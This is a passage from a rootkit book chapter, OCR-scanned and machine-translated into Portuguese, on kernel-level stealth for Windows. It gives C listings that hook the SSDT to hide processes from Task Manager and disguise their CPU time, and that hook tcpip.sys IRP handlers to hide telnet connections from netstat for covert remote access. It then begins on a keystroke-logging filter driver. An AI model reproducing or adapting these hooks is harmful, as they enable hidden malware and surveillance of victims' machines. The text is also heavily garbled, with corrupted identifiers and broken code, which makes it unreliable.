O princípio geral é o seguinte: o aplicativo do usuário causa nº*-função, 
Então o sistema é chamado de função ZW*desejada, que executa o todo 
Trabalho, retornando o resultado no.*-Funções.Não.*-A função transfere o resultado 
Apêndice.Acontece que esse esquema de dois níveis. 
Nossa tarefa é alterar o SSDT para que a função que precisamos seja chamada
ção (nossas funções).Está claro que nossas funções retornarão que são
A ferida que precisamos.Duas macros nos ajudarão com isso: SYS_SERVICE 
e syscall_ind.A primeira macro aceita o endereço de funções e retornos 2SH*
O endereço apropriado no.*-Funções da tabela SSDT 
A segunda macro aceita o endereço 2 \ ¥*-funções e retorna o correspondente
O número (índice) na tabela SSDT. 
Como essas macros funcionam?E muito simples.Todas as 2 \ u*-funções começam
Eles estão com as mesmas instruções: 
mover um x, 
Nnn 
NNN é um índice de chamada do sistema na tabela SSDT.Em seguida, se tivermos 
Existe um índice, então não devemos encontrar nada nele o endereço do correspondente 
Funções na tabela SSDT, pelo contrário, se tivermos uma função da função, então nós 
Podemos descobrir o índice desta função. 
• Definir sys_service (_function) 
\ 
K E S E R V I C E D E S C R I P T O R T A B L E.S e r v i c e t a b l e b a s e [ 
\ 
*(Pulong) ((Pucar) _function+L)] 
Tdefine syscall_ind (_function)*(Pulong) ((Pucar) _function + L) 
Mas isso não é tudo macros.Afinal, o primeiro macros sys_service e s yscall_ind 
Descuidado - eles não fazem nada prejudicial.O que não pode ser dito sobre macros 
H
O
O
K e u
N
H
O
O
K.
.Macro Nook aceita o endereço 7 \ ¥*-funções que precisam
Mas interceptar, calcula seu número no SSDT e substitui o correspondente 
Endereço SSDT _HOOK Endereço da função. 
#Define Hook (_function, 
_Hook, _rig) 
\ 
_Rig = (pvoid) interlockedExchange ( 
(Plong) 
\ 
& MAPPEDSYSTEMCALTABLE [syscall_ind (_function)], 
\ 
(LONGO) 
GANCHO) 
156

pagina: 156

Capítulo 6. Revival no nível do núcleo 
"Definir desengar (_function, _hook, _orig) \ 
InterlainDeDexchange ((PLONG) \ 
& MAPPEDSYSTEMCALTABLE [syscall_ind (_function)], \ 
(Longo) _hook) 
Apenas quatro macros, mas o que eles podem fazer!Provavelmente você de uma vez 
Você quer, usando essas macros, para interceptar algumas funções da API. 
Vamos fazê-lo juntos.Agora vamos escrever um driver de dispositivo, que
Rahi ocultará os processos. 
Sabemos que o Windows possui uma Ormation da API-Function ZwQuerySystemlnf, 
fornecendo várias informações do sistema.Gerenciador de tarefas 
(e outros aplicativos) o usa para obter uma lista de processos.Para 
Isso ele passa para ela o parâmetro Systemlnf OrmationClass = 5. 
Nosso Rutkit interceptará a função NtQuerySystemlnFormation. 
Tendo recebido o resultado de ZwQuerySystemlnf Ormation, Rutkit removerá dele 
Alguns registros. 
Informações sobre processos são armazenadas em estruturas _system_processos 
(processos) e _system_threads (fluxos correspondentes a processos). 
Na estrutura _system_processos, há um elemento muito útil -
Unic0de_string.Aqui o sistema registra o nome do processo.Nós seremos ana
Linear exatamente unic0de_string para "cortar" o necessário
Nomes.Dê uma olhada na definição de estruturas _system_processos 
E _system_threads: 
Struct _system_threads 
EU 
Grande_integer 
Grande_integer 
Grande_integer 
Ulong 
Pvoid 
ID do Cliente 
KPRIORIDADE 
KPRIORIDADE 
Ulong 
Ulong 
Kwait_Reason 
EU
n
­
Struct _system_processos 
{ 
Ulong 
Ulong 
Ulong 
Grande_integer 
Inteiro grande 
Kerneltime; 
Usertime; 
CreateTime; 
Tempo de espera; 
StartAddress; 
Clientes-
Prioridade; 
Prioridade base; 
ContextwitchCount; 
ThreadState; 
Restada de espera; 
NextEntryDelta; 
Contagem de fios; 
Reservado [ 
6 
] 
; 
CreateTime; 
Usertime; 
157

pagina: 157

Rootkits 
Grande_integer 
Kerneltime; 
Unicode_string 
Nome do processo; 
KPRIORIDADE 
Prioridade base; 
Ulong 
Processo; 
Ulong 
Herdado de prprocessídeo; 
Ulong 
HandleCount; 
Ulong 
Reservado2 [2]; 
Vm_counters 
Vmcounters; 
Io_counters 
Ocounters;// apenas para o Windows 2000 
struct _system_threads threads [1];: 
}; 
Em vez de ZwQueryStymlNformation, instalaremos a função
Mizwqurysystystemlnformation.Vamos instalá -lo depois 
Inicialização do motorista durante o desempenho da função do motorista 
(Listagem 6.5). 
Listagem 6.5.Substituição ZwQuerySystemInformation 
Grande_integer usertime; 
Grande_integer kerneltime; 
ZWQuerySystemInformation pred_func; 
Ntstatus driverEntry (em pdriver_object pdriverobject, 
Em punicode_string pregpath) 
{ 
/* 
Código de inicialização do driver ... 
*/ 
// Número de tempo global.Isso permitirá "véu" 
// diferença no tempo do processador - afinal, nosso oculto 
// Os processos usarão o processador 
Usertime.quadPart = KerNelTime.quadPart = 0; 
// Salvar o endereço da antiga função ZwQuerySystemlnFormation 
Pred_func = 
(ZwQuerySystemInformation) 
(Sys_service (zwquerySystemlnformation)); 
// Crie MDL 
mdl = mmcreatemdl (null, 
KeServieDescriptable.ServiceTableBase, 
KeServieDescriptable.NumberOfServices*4); 
if (! mdl) retornar status_unsuccessful; 
MMbuildMdlForNonPagedpool (MDL); 
// permitindo a gravação na região da memória 
mdl-> mdlflags = mdl-> mdlflags |MDL_MAPAP_TO_SYSTEM_VA; 
MapedSystemCallTable = mmmmaplockedPages (mdl, kernelmode); 
// interpretando a chamada do sistema 
158

pagina: 158

Capítulo 6. Revival no nível do núcleo 
Hook (ZwQuerySystemlnformation, 
MyzwQuerySystemlnformation, pred_func); 
Retornar status_success; 
} 
Agora, vamos olhar para a própria função MyzWQuerySystemlnFormation. 
Ela ocultará os processos que começam em "_den".Claro que você 
Você precisa mudar essa linha (não acho que haverá muito no seu sistema 
processos denominados _den*). 
Listagem 6.6.Substituindo a função myzwQuerySystemInformation 
Ntstatus myzwquerySystemlnformation ( 
No Ulong SystemlnformationClass, 
Em Pvoid ​​Systemlnformation, 
Em Ulong Systemlnformationleng, 
OUT PULONG RETURNLENGLE) 
{ 
Ntstatus s; 
S = (zwQuerySystemInformation) (pred_func)) ( 
SystemlnformationClass, 
Systemlnformation, 
SystemlnformationLength, 
ReturnLength); 
if_success (s)) 
{ 
// classe 5 é uma lista de processos 
if (SystemlnformationClass == 5) 
{ 
Struct _system_processes *curr = 
(struct _system_processes *) systemlnformation; 
struct _system_processos *prev = null; 
Enquanto (curr) 
{ 
if (curr-> processname.buffer! = null) 
{ 
if (0 == memcmp (curr-> processname.buffer, 
L "den", 12) 
) 
{ 
Usertime.quadPart += 
Cur-> usertime.quadPart; 
KerNelTime.quadPart += 
Cur-> KerNelTime.quadPart; 
se (prev) 
f 
if (cur-> nextEntrydelta) 
159

pagina: 159

Rootkits 
Prev-> nextEntryDelta += 
Curr-> NextEntryDelta; 
Outro 
Prev-> nextEntryDelta = 0; 
} 
Outro 
{ 
se 
(Curr-> NextEntryDelta) 
(char *) systemlnformation += 
Curr-> NextEntryDelta; 
Outro 
Systemlnformation = null; 
} 
} 
} 
Else // Este é um registro para o processo de inatividade (inativo) 
{ 
// Adicionar tempo do processador do usuário e 
// Hora do processador do núcleo, 
// retornado pelos processos _den*, para o processo ocioso 
Cur-> usertime.quadPart += usertime.quadPart; 
Cur-> KerNelTime.quadPart += 
KerNelTime.quadPart; 
// Redefinir temporizadores 
Usertime.quadPart = 0; 
KerNelTime.quadPart = 0; 
} 
Prev = curr; 
if (cur-> nextEntrydelta) 
((Char *) curr += curr-> nextEntryDelta); 
Else curr = null; 
} 
} 
Caso contrário, if (SystemlNformationClass == 8) 
// Solicitar tempo do processador 
{ 
struct _system_processor_times * times = 
(struct _system_processor_times *) systemlnformation; 
Times-> idletime.quadPart += 
Usertime.quadPart + KerNelTime.quadPart; 
} 
} 
Retorno stat; 
} 
Resta esclarecer um momento.Os processos escondidos por nós ocupam alguns
Tempo do processador Roy.Se compararmos o tempo do processador geral com o total 
O tempo em que todos os processos ocupa, a diferença será evidente.Assim 
160

pagina: 160

Capítulo 6. Revival no nível do núcleo 
Nosso rootkit pode ser descoberto.Precisamos cuidar da ocultação 
Essa diferença.É feito de maneira muito simples.Suponha que um processador geral
O tempo é igual ao tamanho de M. o tempo total, ocupado com todos os processos, 
igual a S. a diferença entre eles - m = k.
Não há coruja.Para onde irá a diferença?Claro, o sistema vai escrevê -lo 
Processo especial - inativo - inação do sistema.Mas desde que oculto 
Existem processos no sistema e, em seguida, cuide do tempo de retirada. 
Nós mesmos nós mesmos.Agora toda a função deve ficar clara para você. 
6.4.Ocultação de conexão (tabela IRP) 
Já examinamos duas maneiras de instalar armadilhas no núcleo - no primeiro 
Caso colocamos uma armadilha na tabela IDT e no segundo - no SSDT, mas em 
O núcleo é outro lugar em que você pode colocar uma armadilha, esta é uma tabela 
funções disponíveis em cada driver de dispositivo.Imediatamente após a instalação 
O motorista inicializa as tabelas das funções - eles contêm os endereços
Ksium que atende a vários tipos de pacotes IRP (Pacotes de solicitação de E/S). 
O IRP é controlado por vários tipos de solicitações, como gravação, leitura. 
Como os drivers de dispositivos são mal verificados por anti -rHubar
Puts, a tabela IRP é o local ideal para instalar uma armadilha. 
Considere os tipos padrão de pacotes IRP definidos na Microsoft 
DDK: 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
• Definir 
Irp_mj criar 
IRP_MJ_CREATE PIPE DE NOMADO 
Irp_mj fechar 
Irp_mj_read 
Irp_mj_write 
IRP_MJ_QUERY 
Informação 
Irp_mj_set_information 
IRP_MJ_QUERY_EA 
Irp_mj_set_ea 
Irp_mj_flush_buffers 
Irp_mj_query volume_information 
Irp_mj_set_volume 
Informação 
IRP_MJ Controle do diretório 
IRP_MJ_FILE 
SystemJControl 
IRP_MJ_DEVICE CONTROL 
Irp_mj_internal_device_control 
IRP_MJ DESLIMENTO 
IRP_MJ_LOCK CONTROL 
IRP_MJ_CLEANUP 
Irp_mj_create_mailslot 
Segurança de consulta IRP MJ 
0x00 
0 x 0 1 
0x02 
0x03 
0x04 
0x05 
0x06 
0x07 
0x08 
0x09 
0x0a 
0x0b 
0 x 0 C 
Oxod 
Oxoe 
OXOF 
0x10 
0x11 
0x12 
0x13 
0x14 
6 Zak.665 
161

pagina: 161

Rootkits 
#definir 
IRP_MJ_SET_SECURITY 
0x15 
#definir 
Irp_mj_power 
0x16 
#definir 
Irp_mj_system_control 
0x17 
#definir 
IRP_MJ_DEVICE_CHANGE 
0x18 
TDEFINE 
IRP_MJ_QUERY_QUOTA 
0x19 
#definir 
Irp_mj_set_quota 
Oxla 
#definir 
IRP_MJ_PNP 
Oxlb 
#definir 
IRP_MJ_MAXIMUM_FUNCTION 
Oxlb 
Qual driver e qual IRP o usa?Depende do fato de que você é
Faça um tit.Espero que você entenda qual é o problema.Idt é um único 
(um pouco no caso de uma máquina multiprocessadora), e as tabelas IRP são diferentes 
(Cada motorista tem seu próprio).Se você, por exemplo, quer ocultar TCR
Fim, você deve instalar uma armadilha para os drivers IRP TCPIP. 
Sys.Neste parágrafo, consideraremos a armadilha para esse motorista. 
Se considerarmos todos os motoristas possíveis, não haverá livros suficientes. 
Nosso objetivo é ocultar as portas de rede.Isso é muito importante, porque na maioria 
casos rutkit usará conexões de TCR para fornecer 
acesso remoto.Ocultar o processo que fornece remoto 
Acesso, acabamos de aprender, mas utilitários como o NetStat (Fig. 6.2)
O intestino mostra que algum processo define uma conexão TCP.Se 
Instalaremos uma armadilha no driver IRP TCPIP.Sys, nossas portas abertas 
Ninguém vai ver. 
Arroz.6.2.Conclusão típica do utilitário NetStat 
O utilitário NetStat mostra um protocolo, endereços locais e remotos, 
Números de porta e a condição da conexão. 
162

pagina: 162

Capítulo 6. Revival no nível do núcleo 
OBSERVAÇÃO. 
A conexão com o IRP ajudará a se proteger dos olhos do usuário, 
Capaz de usar o programa NetStat e alguns IDs locais.Mas pro
O IDS de rede esse método é impotente.Sobre como contornar os IDs de rede, ainda somos
Dema falar. 
A primeira coisa que precisamos fazer para interceptar as tabelas IRP é decidir 
com o driver e o dispositivo associado a ele.No nosso caso, o motorista 
Haverá tcpi P. sys e o dispositivo - \ \ \ d e v i c e \ t c p.Mas não podemos
Em seguida, especifique o nome do arquivo de driver, devemos usar o objeto do driver. 
Para isso, a função LogetDeviceObjectPointer é usada.Dado 
As funções precisam transmitir o nome do dispositivo e, na saída, obtemos o objeto do FI
La (pfile_object) e o objeto do dispositivo (pdriver_object).Lip de objeto
O enxame contém sinais no motorista do motorista, que contém a tabela
Funções da TSU (Fig. 6.3). 
O objeto do dispositivo 
Indicador sobre.Dr. 
Objeto de driver 
IRP MJ Escreva 
Arroz.6.3.O objeto do dispositivo e o driver do driver 
Como sempre, o rutkit deve salvar o endereço da função original, para 
que você deseja instalar uma armadilha.Depois que sua função é
Todas as ações necessárias latindo, pode causar uma função original 
- para que ninguém suspeite de nada.Além disso, o endereço da função inicial é necessário 
Ao descarregar a raiz da memória - se você quiser fazer isso.Para a boca
Usaremos a nova armadilha interlockedExchange. 
O próximo código recebe um ponteiro para o driver TCPIP.Sistemas (de acordo com o dado 
O nome do dispositivo é \\ dispositivo \\ tcp) e define uma armadilha para 
Irp_mj_device_control (usado para controlar o TCR
enxame). 
Listagem 6.7.Intercepção IRP MJ Controle de dispositivo 
• Inclua "ntddk.h" 
• Incluir 
"Tdiinfo.h" 
Arquivo ptr ptr pfile; 
163

pagina: 163

Rootkits 
Pdevice_object ptr_dev_tcp; 
Pdevice_object ptr_dev_tcpip 
Typedef ntstatus (*prev_rpmjdevicontrol) 
(Em pdevice_object, em 
PIRP); 
Prev_irpmjdeviceCtrol prev_func; 
Ntstatus install_hook () 
{ 
Ntstatus s; 
Unicode_string dev_unicode; 
Wchar dev_name [] = l "\\ dispositivo \\ tcp"; 
Ptr_file 
= Nulo; 
ptr_dev_tcp 
= Nulo; 
ptr_dev_tcpip = null; 
Rtllnitunicodestring (& dev_unicode, dev_name); 
S = igetDeviceObjectPointer (& dev_unicode, 
File_read_data, & ptr_file, & ptr_dev_tcp); 
if (! nt_success 
(s)) retornar s; 
ptr_dev_tcpip = ptr_dev_tcp-> driveRobject; 
// salve o endereço da função original 
Prev_func = 
ptr_dev_tcpip-> majorfunction [irp_mj_device_control]; 
// Defina uma armadilha - uma função com o gancho de nome 
se (prev_funk) 
InterlockedExchange ((PLONG) 
SPTR_DEV_TCPIP-> MaiorFunction [IRP_MJ_DEVICE_CONTROL], 
(Longo) gancho); 
Retornar status_success; 
} 
Só temos que escrever a própria função do gancho.Este será o mais difícil
uma parte da nossa tarefa.Ao desenvolver essa função, precisamos aprender
Limite diferentes tipos de verificações de IRP para o driver TCP.SYS - afinal, além de 
IRP_MJ_DEVICE_CONTROL, também existem outras solicitações.Foi o primeiro 
O que precisamos considerar.E o segundo é o código de controle do código 
- icontrolCode.Se for igual a octl_tcp_query_information_ex, 
Em seguida, o motorista é obrigado a fornecer ao programa como o NetStat sobre informações sobre 
Todas as conexões (sobre todas as portas abertas). 
O buffer das consultas recebidas deve ser trazido para o tipo tdlobjectId: 
#define co_tl_entity 0x400; 
#define cl_tl_entity 0x401; 
#Define ioctl_tp_query_information_ex 0x00120003 
Typedef stdientyld { 
ulong tei_entity; 
ulong tei_instance; 
} Tdientityld; 
Typedef stdlobjectid { 
164

pagina: 164

Capítulo 6. Revival no nível do núcleo 
Tdientyld toi_entity; 
ulong toi_class; 
ULONG TOI_IDL 
} TdioBjectId; 
A próxima etapa - precisamos encontrar o buffer de entrada e trazê -lo para o tipo 
TdioBjectId.Se a solicitação LRP for enviada usando o método 
Method_neither (como no caso do NetStat), então o buffer de entrada pode ser encontrado em 
Parâmetros de campo.devicelocontrol.type3InputBuffer 
IRP-Glass. 
O vidro IRP em si pode ser obtido usando a função iGetCurrentLRP
Stacklockation: 
Pio_stack_location plrp_stack = 
IoGetCurrentLrpStackLocation (PLRP); 
O buffer de entrada pode ser obtido e levar ao tipo tdiobjetid usando 
O próximo operador: 
Inpbuf = (tdioBjectId *) 
Irp_stack-> parameters.devicelocontrol.type3inputBuffer; 
Para ocultar as portas TCP, usaremos as solicitações do objeto co_tl_ 
Entidade e portas UDP - cl_tl_entity.Você também precisa levar em consideração o campo 
Toi_id estruturas tdiob jectId - com sua ajuda, você pode determinar a partir do que
Com as chaves, o usuário iniciou o utilitário NetStat (por exemplo, NetStat -o). 
Como o buffer de entrada é levado ao tipo tdioB j ECTID, o campo t u i _ e n t i t y. 
Tei_entity deve conter co_tl_entity para portas tcp e cl_tl_ 
Entidade - para portas UDP. 
A última etapa é escrever sua própria função Localizando Tine, 
Sobre o qual já mencionamos no parágrafo 5.6.Esta função é causada por um despachante 
Entrada/saída quando o driver TCPIP.SS terminará o pacote IRP do processo 
E preencha o buffer de saída com dados solicitados.Nós vamos 
Filtre esses dados nos interesses de Rutkin, certo? 
Passe os parâmetros da função 
IocomlationingRoutine 
Você pode passar 
Irp_stack-> contexto.Esses parâmetros serão o endereço da função inicial 
IocomlingtioningRoutine e inpbuf-> toi_id para funcionar 
pode determinar o formato do buffer de saída. 
Confuso?Nada, agora consideraremos o código completo da função de armadilha, 
O que colocará tudo em seu lugar (listando 6.8). 
Listagem 6.8.Processador seu processador IRP_MJ_DEVICE_CONTROL 
Ntstatus Hook (em pdevice_object pdeviceObject, no PIRP PLRP) 
( 
// ponteiro de vidro IRP 
165

pagina: 165

Rootkits
Pio_stack_location sirp;
// Método de transferência (estamos interessados ​​em Method_neither)
ULONG IO_TRANSTYPE;
// buffer de entrada
TdioBjectId *inpbuf;
// parâmetros para ocplemingRoutine
Contexto dword;
// Obtenha um ponteiro para o IRP Glass
Sirp = ioGetCurrentLrpStackLocation (PLRP);
Switch (Sirp-> MajorFunction)
{
Case irp_mj_device_control:
if ((Sirp-> Minorfunction == 0) &&
(sirp-> parameters.devicelocontrol.locontrolcode ==
Ioctl_tcp_query_information_ex))
{
Io_transtype =
sirp-> parameters.devicelocontrol.locontrolCode;
Io_transtype & = 3;
if (iojzRantype == Method_neither)
f
Inpbuf =
(TdiobjectId*)
sirp-> parameters.devicelocontrol.type3inputBuffer;
// pacotes tcp - co_tl_entity
ifbuf-> toi_entity.tei_entity ==
Co_tl_entity)
{
se (
(Inpbuf-> toi_id == 0x101)
|(Inpbuf-> toi_id == 0x102)
||(Inpbuf-> toi_id == 0x110))
(
// Ligue para o ICEllictionRoutine, se o IRP for bem -sucedido
Sirp-> Control = 0;
Sirp-> Control | = sl_invoke_on_success;
Sirp-> context = (pi0_c0mplenition_routine)
ExallocatePool (NONPAGEDPOOL,
Sizeof (reqinfo));
((Preqinfo) sirp-> context)-> 01dCompletion =
Sirp-> conclusão;
((Preqinfo) slrp-> context)-> reqtype =
Inpbuf-> toi_id;
Sirp-> conclusão
(PIO_COMPLOTION_ROUTINE) Compleção;
}
}
}
}
166

pagina: 166

Capítulo 
6. Revival 
sobre 
nível 
Núcleos 
Quebrar; 
Padrão: quebra; 
} 
// Ligue para a função de controle inicial do dispositivo 
Return prev_func (pdeviceObject, plrp); 
} 
Agora vamos para o desenvolvimento de nossa função ICOMOL.
Tionroutine, que chamaremos de MyComplem.Vai ser ainda mais difícil 
do que o anterior. 
Acontece que tudo o que foi feito acima é apenas para
De volta à pilha IRP, a função final.Somente com sua ajuda pode ser
Os dados reainse sobre as conexões de rede retornaram ao driver do TCPIR.Sys. 
Afinal, o manipulador do IRP (nossa função de gancho) não é capaz de fazer isso - então 
A Microsoft já foi concebida.Obviamente para maior segurança, mas nós 
E deu a volta. 
Como já observado, o procedimento final é chamado depois 
como tcpip.O SYS preencheu o buffer de saída.O mais difícil é que a estrutura 
O buffer de saída depende das chaves que o usuário indicou ao ligar 
Netstat.Por exemplo, o utilitário da chave do Octic NetStat permite exibir o processo PID
As corujas que possuem portas abertas (Fig. 6.4).Então com a ajuda 
Lista de tarefas pode encontrar o arquivo de processo executável de acordo com o seu PID (Fig. 6.5). 
"C: \ win00ws \ System3z \ cmd, e" ou seja, 
Microsoft Windows XP [versão 5.1.26001 
<C> Microsoft Corporation, 198S-2Q01. 
C: Sdocuments e SettingSdenis> netstat -o 
Conexões ativas 
Nome 
Endereço local 
Endereço externo 
TCP 
Den: L215 
124.12.25.149:519(3 
TCP 
Den: 1589 
Pop.nail.Prosorz 
TCP 
Den: 1590 
ads.ueb.aol.con: http 
C: \ Documentos e Settinas \ Denis> _ 
Estado 
Estabelecido 
Ti No._uaii 
Estabelecido 
-| 
PID 
1452 
0 
1452 
X 
EU-
Arroz.6.4.Nós exibimos proprietários de portas PID 
Se o NetStat for iniciado com a chave -O, o TCPIP.SS retorna a estrutura do buffer
Tours Conninfo102.Se o NetStat for lançado com uma chave -com o buffer 
Haverá uma estrutura Conninfo110. 
167

pagina: 167

Rootkits 
E em c: \ wind0ws \ system32 \ tmd.exe 
Lsflss.exe 
V84 Console 
Suchosi.exe 
936 Console 
Suchost.exe 
980 Console 
Suchost.exe 
1132 Console 
Suchosi.exe 
1216 Console 
Echrsh8ev.eh 
1304 Console 
Sp00lsu.exe 
1480 Console 
Kundll32.exe 
1S36 Console 
Ctfhon.exe 
1544 Console 
NUSC32.EXE 
1628 Console 
o u t p o s t.Exe 
1648 Console 
o morcego.Exe 
1932 Console 
TOTFTLCMD.EXE 
668 Console 
Uinuobd.exe 
120 Console 
Opera.exe 
1904 Console 
nge.exe 
1528 Console 
ftaentsur.exe 
mentiras 
“Tímido^inz^ovo! 
Shch^l £. 
Cnd.exe 
N^6 ( 
^"Console 
> 2 Cynsole 
KL £ 6nsole 
n s p a i n t.Exe 
1yish Console 
Suchosi.exe 
1500 console 
lista de tarefas.Exe 
1920 Console 
Imipruse.exe 
1360 Console 
C: \ Docunentes e Settin <JS \ Denis> 
-1sh 
0 
1.276 kb 
0 
1 440 KB 
0 
8 464 Ks 
0 
892 KB 
0 
588 KB 
0 
8 852 KB 
0 
940 KB 
0 
400 kb 
0 
668 KB 
0 
408 KB 
0 
15 940 KB 
0 
19 928 KB 
0 
3 588 KB 
0 
43 332 KB 
0 
28 728 KB 
0 
8 840 KB 
0 
6 072 KB 
0 
14 636 KB 
0 
1.452 kb 
0 
13 592 KB 
0 
2 940 KB 
0 
2 700 KB 
0 
3 816 KB 
*
J. 
"
G
] 
Ll 
Arroz.6.5.Exibimos uma lista de tarefas 
Em todos os outros casos, o buffer terá a estrutura do Conninfo101. 
Considere todas essas estruturas: 
#Define htons (a) (((oxffsa) << 8) + ((oxffoo & a) 
>> 8) 
) 
Typedef struct _conninfo101 { 
Status longo não assinado; 
SRC_ADDR LONG SRC_ADDR não assinado; 
Não assinado curto src_port; 
UNKL UNKL UNSIGNADO; 
Não assinado long dst_addr; 
Não assinado curto dst_port; 
UNK2 não assinado UNK2; 
} Conninfo101, *pconninfo101; 
Typedef struct _conninfo102 { 
Status longo não assinado; 
SRC_ADDR LONG SRC_ADDR não assinado; 
Não assinado curto src_port; 
UNKL UNKL UNSIGNADO; 
Não assinado long dst_addr; 
Não assinado curto dst_port; 
UNK2 não assinado UNK2; 
PID longo não assinado; 
} Conninfo102, *pconninfo102; 
Typedef struct _conninfo110 { 
Tamanho longo não assinado; 
Status longo não assinado; 
SRC_ADDR LONG SRC_ADDR não assinado; 
Não assinado curto src_port; 
UNKL UNKL UNSIGNADO; 
168

pagina: 168

Capítulo 6. Revival no nível do núcleo 
Não assinado por muito tempo 
d s t _ a d d r; 
Não assinado s h o r t 
d s t _ p o r t; 
Não assinado s h o r t 
Unk2; 
Longo não assinado p i d; 
Pvoid ​​unk3 [35]; 
} Conninfo102, 
*Pconninfo102; 
A função MyComplement recebe contexto.
Hook destacou a memória.O contexto é um ponteiro para dados de dados 
Preqinfo.Você o usará para rastrear conexões. 
Cada conexão está em um determinado estado: 
0 - invisível; 
1 - fechado - fechado; 
2 - escuta - escuta; 
3 - syn_sent - enviado syn; 
4 - syn_receined - syn recebido; 
5 - estabelecido - instalado; 
6 - fin_wait_1 - expectativa de barbatanas (l); 
7 - fin_wait_2 - expectativa de barbatanas (2); 
8 - Close_wait - Espera -se que a conexão seja fechada; 
9 - Clowing - a conexão fecha. 
Você já percebeu que pode ocultar todas as conexões que precisamos estabelecer 
Para eles, status 0 (invisível)? 
Suponha que vamos ocultar todas as conexões em 23 portas (telnet). 
Então o rootkit pode iniciar livremente seu próprio servidor telnet em 
Um computador de computador, fornecendo um acesso de telnet a um computador.Nosso 
A função MyComplem é fornecida na Listagem 6.9. 
Listagem 6.9.Processando dados sobre compostos recebidos do tcpip.sys 
Ntstatus mycomplement (em 
Pdevicej3bject pdeviceObject, 
No PIRP pl'rp, 
No contexto pvoid) 
{ 
Pvoid ​​outbuf;// 
Boofer de saída 
DWord numbufs;// 
O número de buffers de conclusão 
Pio_completion_routine p_crautine; 
DWORD 
EU; 
169

pagina: 169

Rootkits 
outbuf = pirp-> userBuffer; 
/ / Nós obtemos a previsão de conclusão, transferida via contexto 
p_crautine = 
((Preqinfo) contexto)-> 01dCompletion; 
se 
((Preqinfo) contexto)-> reqtype == 0x101) 
{ 
numbufs = irp-> iostatus.information / 
Sizeof (conninfo101); 
Ford = 0;I <numOutputBuffers;I ++) 
{ 
// Escondemos todas as conexões em 23 portas (telnet) 
if (htons (( 
(PconnInfo101) Ultbuf) 
[i] .dst_port) == 23) 
((Pconninfo101) outbuf) [i] .status = 0; 
Caso contrário, se (((preqinfo) contexto)-> reqtype == 0x102) 
{ 
numbufs = irp-> iostatus.information / sizef 
(Conninfo102); 
para (i = 0; i <numOutputBuffers; i ++) 
{ 
// Escondemos todas as conexões em 23 portas (telnet) 
if (htons 
(
((PconnInfo102) outbuf) 
[i] .dst_port) == 23) 
((PconnInfo102) outbuf) [i] .status = 0; 
} 
} 
Else if (((preqinfo) contexto)-> reqtype == 0x110) 
( 
numbufs = irp-> iostatus.information / 
Sizeof (conninfo110); 
para (i = 0; i <numOutputBuffers; i ++) 
{ 
if ((((((((pconnInfo1110) outbuf) [i] .dst_port) == 23) 
((Pconninfollo) outputBuf) [i] .status = 0; 
) 
} 
E x f r e e p o l (c o n t e x t); 
se 
((PIRP-> StackCount> (Ulong) l) l) &
& (p_crotine 
! = Nulo) 
{ 
retornar 
(p_crautine) (pdeviceObject, 
p l r p, nulo); 
) 
Outro 
{ 
Retornar pirp-> iostatus.status; 
6.5.Drivers de vários níveis 
Nesta seção, tentaremos sistematizar o que já aprendemos sobre 
Pacotes de IRP e como geralmente ocorre a troca de dados entre o benefício
Programa Vatel e Driver. 
170

pagina: 170

Capítulo 6. Revival no nível do núcleo 
Os desenvolvedores do sistema operacional do Windows facilitaram a vida útil não apenas 
nós mesmos, mas também para nós, tendo inventado uma combinação de drivers do mesmo dispositivo 
Na corrente.Suponha que seja necessário garantir a operação do dispositivo MyDevice em 
Três modos: 
• 
ordinário; 
• 
com criptografia de dados; 
• 
Com criptografia e correção de erros. 
Você pode escrever três motoristas separados, cada um dos quais será
manter como um componente de baixo nível, trabalhando diretamente com 
equipamento e componente que fornece ao usuário adjacente
Interface de alto nível para trabalhar com o dispositivo.Segundo e 
Os terceiros motoristas também incluirão um componente intermediário, execução
Criptografia e correção de nichos.Não muito econômico. 
Mas você pode organizar um motorista de vários níveis.O nível mais baixo 
Realiza a interação de hardware com o dispositivo.Altíssima 
Fornece uma interface do usuário para trabalhar com o dispositivo.EM 
Nosso caso do dispositivo abstrato do MyDevice terá três drivers: 
O primeiro fornecerá serviços de baixo nível para os próximos dois, OMC
O enxame criptografará dados e o terceiro receberá os resultados
Você é o trabalho dos dois primeiros e fornece seu próprio serviço - correção 
dados.O motorista intermediário pode ser configurado (por exemplo, através de 
As chaves do registro) para perder a etapa de criptografia. 
Acontece que ao desenvolver um motorista de um nível mais alto, você não é 
Você precisa cuidar das funções de que os drivers têm um desempenho inferior
TH TH: Alguém já implementou essas funções para você. 
Drivers de todos os níveis para um dispositivo formam uma cadeia de drivers. 
O motorista de baixo nível trabalha diretamente com o "ferro". 
Os motoristas de alto nível geralmente são responsáveis ​​pela formatação (antes
estadiamento) dados, códigos de erro, conversão de dados de um
Mat em outra e outras operações que não estão de forma alguma relacionadas ao hardware
culinária. 
O que é interessante para motoristas multiníveis para nós?Multi -Level 
Os motoristas não apenas interceptam e transmitem dados, mas também alteram -os 
Antes de transferir para o próximo nível.Eles são ideais para criar
Rutkin. 
Usando motoristas de vários níveis, podemos interceptar qualquer lábios
O sistema do sistema é do teclado ao disco rígido.Além disso, vários níveis 
171

pagina: 171

Rootkits 
Os motoristas nos permitem evitar escrever um baixo bastante complicado
código de nível. 
Suponha que precisamos escrever um teclado TUN
MKU, protoculando todas as teclas das teclas.Não temos que desenvolver
Pegue seu próprio driver de teclado.É o suficiente para escrever uma camada 
Fornecendo protocolamento de pressionamentos de teclas.E isso, acredite, sei
É puramente mais fácil do que escrever um motorista do zero. 
6.5.1.K a para o Windows funciona com drivers 
Antes de começar a desenvolver sua própria unidade de nível múltiplo
Vera, você precisa saber como o Windows controla os drivers.A maneira mais fácil 
Explique isso pelo exemplo.Já que vamos escrever um sniffer 
teclado, então explicaremos o trabalho com os motoristas no exemplo da tecla
Motorista do autor. 
Nosso teclado Smniff funcionará no mais alto nível.Maioria 
Interessante é que em um ponto em que podemos interceptar as teclas, 
Eles já estão convertidos em pacotes IRP.Esses IRP se movem para cima e para baixo 
Na cadeia de motoristas.Tudo o que precisamos é inserir nossa raiz nisso 
corrente. 
Mas uma adição simples do motorista à cadeia de drivers não é suficiente. 
Rutkin deve criar um dispositivo e adicioná -lo ao grupo correspondente
Dispositivos PU (cadeia de dispositivos).Para deixar mais claro, considere 
O próximo desenho (Fig. 6.6). 
Cada driver da cadeia está associado ao dispositivo correspondente no grupo 
